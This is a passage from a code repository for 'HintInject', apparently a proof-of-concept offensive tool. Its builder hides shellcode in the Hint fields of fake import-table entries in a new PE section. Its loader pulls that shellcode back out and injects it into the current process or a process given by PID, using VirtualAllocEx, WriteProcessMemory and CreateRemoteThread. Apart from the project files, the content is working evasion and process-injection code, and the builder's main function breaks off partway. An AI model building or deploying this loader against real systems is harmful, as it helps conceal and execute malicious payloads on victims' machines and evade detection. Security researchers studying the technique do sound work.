    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions);SOLUTIONDIR=R"($(SolutionDir))"</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions);SOLUTIONDIR=R"($(SolutionDir))"</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions);SOLUTIONDIR=R"($(SolutionDir))"</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="FakeEntry.cpp" />
    <ClCompile Include="Main.cpp" />
    <ClCompile Include="Utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="DllNamesForFakeImports.h" />
    <ClInclude Include="FakeEntry.h" />
    <ClInclude Include="Structs.h" />
    <ClInclude Include="Utils.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HintInject.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FakeEntry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FakeEntry.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DllNamesForFakeImports.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Structs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`HintInjectLoader/HintInjectLoader.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="JustLoader|Win32">
      <Configuration>JustLoader</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="JustLoader|x64">
      <Configuration>JustLoader</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{f17d44f3-c60a-4b9e-baf5-7a91ffd2e990}</ProjectGuid>
    <RootNamespace>HintInjectLoader</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HintInjectLoader/HintInjectLoader.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`HintInjectLoader/Main.cpp`:

```cpp
#include <Windows.h>
#include <iostream>

// Inject shellcode. For the PoC, I used the simplest VirtualAllocEx + CreateRemoteThread method
void InjectShellcode(PBYTE shellcode, size_t shellcodeSize, DWORD pid) {
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (processHandle == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Error for opening the given pid!" << std::endl;
		return;
	}
	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!remoteBuffer) {
		std::cout << "[!] Error on allocation !" << std::endl;
		return;
	}
	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, shellcodeSize, NULL)) {
		std::cout << "[!] Error on remote writing !" << std::endl;
		return;
	}
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (remoteThread == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Error on remote thread creation !" << std::endl;
		return;
	}
	WaitForSingleObject(remoteThread, -1);
	CloseHandle(processHandle);
	HeapFree(GetProcessHeap(), 0, shellcode);
}

// To determine the fake entries, we can check its RVA, because we used our new .rrdata section to store them.
bool IsFakeEntry(PIMAGE_SECTION_HEADER fakeSection, DWORD importLookupTableRVA) {
	// If the Import Lookup Table of the entry is in our fake section, we can say that it is a fake entry added by us
	if (fakeSection->VirtualAddress < importLookupTableRVA && fakeSection->VirtualAddress + fakeSection->Misc.VirtualSize > importLookupTableRVA) {
		return true;
	}
	return false;
}

// Parse the shellcode from its hint/name table
PBYTE ParseTheShellcode(size_t &shellcodeSize) {
	PIMAGE_IMPORT_DESCRIPTOR* fakeDllEntryArray;
	int fakeDllEntryArraySize = 0;
	PBYTE TEBPtr = (PBYTE) __readgsqword(0x30);
	PBYTE PEBPtr = *((PBYTE*)(TEBPtr + 0x060));
	// Parse the image base address from the PEB and TEB
	PBYTE imageBaseAddress = *(PBYTE*)(PEBPtr + 0x10);
	PIMAGE_NT_HEADERS ntHeader = ((PIMAGE_NT_HEADERS)((size_t)imageBaseAddress + ((PIMAGE_DOS_HEADER)imageBaseAddress)->e_lfanew));
	PIMAGE_DATA_DIRECTORY importDirectory = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importDirectory->VirtualAddress == NULL) {
		std::cout << "[!] Import Table not found !" << std::endl;
		return NULL;
	}
	size_t importDirectorySize = importDirectory->Size;
	size_t importDirectoryRVA = importDirectory->VirtualAddress;
	size_t offsetILT = 0;
	PIMAGE_IMPORT_DESCRIPTOR ITEntryCursor = NULL;
	PIMAGE_IMPORT_DESCRIPTOR fakeITEntryCursor = NULL;
	PIMAGE_THUNK_DATA fakeILTCursor = NULL;
	PIMAGE_SECTION_HEADER sectionHeaderCursor = (PIMAGE_SECTION_HEADER)(((uint64_t)ntHeader) + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER fakeSection = NULL;
	PIMAGE_IMPORT_BY_NAME hintNameTableEntry = NULL;
	// Traverse the sections to find the ..radata address
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		if (strncmp((LPCSTR)sectionHeaderCursor->Name,".rrdata",strlen((LPCSTR)sectionHeaderCursor->Name)) == 0) {
			fakeSection = sectionHeaderCursor;
			break;
		}
		sectionHeaderCursor = (PIMAGE_SECTION_HEADER)(((uint64_t)sectionHeaderCursor) + sizeof(IMAGE_SECTION_HEADER));
	}
	if(fakeSection == NULL){
		std::cout << "[!] Fake Section not found !" << std::endl;
		return NULL;
	}
	size_t parsedSize = 0;
	fakeDllEntryArray = (PIMAGE_IMPORT_DESCRIPTOR*) HeapAlloc(GetProcessHeap(), NULL, importDirectorySize);
	if (fakeDllEntryArray == NULL) {
		std::cout << "[!] Array allocation problem !" << std::endl;
		return NULL;
	}
	// From the importDirectory parse the entries
	for (; parsedSize < importDirectorySize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		ITEntryCursor = (PIMAGE_IMPORT_DESCRIPTOR)(importDirectoryRVA + (ULONG_PTR)imageBaseAddress + parsedSize);
		if (ITEntryCursor->OriginalFirstThunk == NULL && ITEntryCursor->FirstThunk == NULL) {
			break;
		}
		// If it is fake entry, it contains our shellcode
		if (IsFakeEntry(fakeSection, ITEntryCursor->OriginalFirstThunk)) {
			fakeDllEntryArray[fakeDllEntryArraySize++] = ITEntryCursor;
		}
	}
	if (fakeDllEntryArraySize == 0) {
		std::cout << "[!] Fake DLL Entries not found !" << std::endl;
		return NULL;
	}
	std::cout << "[+] Fake DLL Entries found !" << std::endl;
	for (int i = 0; i < fakeDllEntryArraySize; i++) {
		fakeITEntryCursor = fakeDllEntryArray[i];
		// Travese the Import Lookup Table of our fake entries
		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk+ imageBaseAddress);
		offsetILT = 0;
		// Traverse once for calculating size of the shellcode
		while (true) {
			fakeILTCursor = (PIMAGE_THUNK_DATA)(((uint64_t)fakeILTCursor) + offsetILT);
			if (fakeILTCursor->u1.AddressOfData == 0) {
				break;
			}
			hintNameTableEntry = (PIMAGE_IMPORT_BY_NAME)(fakeILTCursor->u1.AddressOfData + imageBaseAddress);
			shellcodeSize += 2;
			offsetILT = (sizeof(IMAGE_THUNK_DATA));
		}
	}
	std::cout << "[+] Size of the total merge is " << shellcodeSize << std::endl;
	PBYTE shellcodeArea = (PBYTE) HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
	PBYTE cursor = shellcodeArea;
	// Copy the shellcode to the newly allocated area
	for (int i = 0; i < fakeDllEntryArraySize; i++) {
		fakeITEntryCursor = fakeDllEntryArray[i];
		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk + imageBaseAddress);
		offsetILT = 0;
		while (true) {
			fakeILTCursor = (PIMAGE_THUNK_DATA)(((uint64_t)fakeILTCursor) + offsetILT);
			if (fakeILTCursor->u1.AddressOfData == 0) {
				break;
			}
			hintNameTableEntry = (PIMAGE_IMPORT_BY_NAME)(fakeILTCursor->u1.AddressOfData + imageBaseAddress);
			memcpy(cursor, &(hintNameTableEntry->Hint), sizeof(WORD));
			cursor += 2;
			offsetILT = (sizeof(IMAGE_THUNK_DATA));
		}
	}
	std::cout << "[+] Hints are merged !" << std::endl;
	return shellcodeArea;
}

int main(int argc, char *argv[]) {
	PBYTE mergedShellcode = NULL;
	uint64_t shellcodeSize = 0;
	// Parse the shellcode from hint/name table
	mergedShellcode = ParseTheShellcode(shellcodeSize);
	// Inject the given shellcode to the process whose PID is given or execute it
	if (argc < 2) {
		InjectShellcode(mergedShellcode, shellcodeSize, GetCurrentProcessId());
	}	
	else {
		InjectShellcode(mergedShellcode, shellcodeSize, atoi(argv[1]));
	}
	return 0;
}
```

`Main.cpp`:

```cpp
#include <Windows.h>
#include <iostream>
#include <time.h>
#include "Utils.h"
#include "FakeEntry.h"
void PrintBanner() {
	LPCSTR banner =
		"                                                                      \n"
		",--.  ,--.,--.          ,--.  ,--.          ,--.               ,--.   \n"
		"|  '--'  |`--',--,--, ,-'  '-.|  |,--,--,   `--' ,---.  ,---.,-'  '-. \n"
		"|  .--.  |,--.|      \\'-.  .-'|  ||      \\  ,--.| .-. :| .--''-.  .-' \n"
		"|  |  |  ||  ||  ||  |  |  |  |  ||  ||  |  |  |\\   --.\\ `--.  |  |   \n"
		"`--'  `--'`--'`--''--'  `--'  `--'`--''--'.-'  / `----' `---'  `--'   \n"
		"                                          '---'                       \n";
	std::cout << banner << std::endl;
}

void PrintHelp(LPCSTR exeName) {
	std::cout << "[+] Usage: " << exeName << " <Shellcode File> <Output Name>";
}


int main(int argc, char* argv[]) {
	PrintBanner();
	if (argc != 3) {
		PrintHelp(argv[0]);
		return -1;
	}
	srand(time(NULL));
	size_t shellcodeSize = 0;
	size_t loaderSize = 0;
	size_t newPESize = 0;
	uint64_t numberOfChunks = 0;
	// Read the shellcode file
	PBYTE shellcodeContent = ReadFileFromDisk(argv[1], shellcodeSize);
	if (shellcodeContent == NULL || shellcodeSize == 0) {
		std::cout << "[!] Error on reading the shellcode file !" << std::endl;
		return -1;
	}
	std::cout << "[+] Shellcode file is read !" << std::endl;
	// Compile the loader binary and get the path of it, later we will append new fake entries to that binary
	LPCSTR loaderPath = CompileLoader();
	if (loaderPath == NULL) {
		std::cout << "[!] Error on loader compilation !" << std::endl;
		return -1;
	}
	std::cout << "[+] Loader binary is compiled !" << std::endl;
	// From the path, read the binary
	PBYTE loaderContent = ReadFileFromDisk(loaderPath, loaderSize);
	if (loaderContent == NULL || loaderSize == 0) {
		std::cout << "[!] Error on reading the loader binary !" << std::endl;
		return -1;
	}
	std::cout << "[+] Compiled binary is read !" << std::endl;
	// Since each hint field is 2 bytes, we can split it, also pad it
	PBYTE hintArray = SplitShellcode(shellcodeContent, shellcodeSize, numberOfChunks);
